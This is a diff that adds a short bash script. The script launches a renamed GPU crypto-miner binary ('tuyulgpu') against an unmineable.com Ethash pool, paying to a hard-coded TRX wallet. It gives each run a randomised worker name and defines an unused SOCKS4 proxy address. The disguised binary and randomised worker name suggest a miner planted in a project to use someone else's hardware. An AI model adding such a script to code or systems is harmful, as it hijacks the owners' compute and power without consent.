@@ -1,0 +1,8 @@
+
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=TRX:TQ6EbnnJmwpEbDmisRFz1ZMc9FunZsfEVE
+WORKER=$(echo $(shuf -i 1-70 -n 1)-GPU#leh7-pwum)
+chmod +x tuyulgpu
+PROXY=socks4://198.50.177.44:44699
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
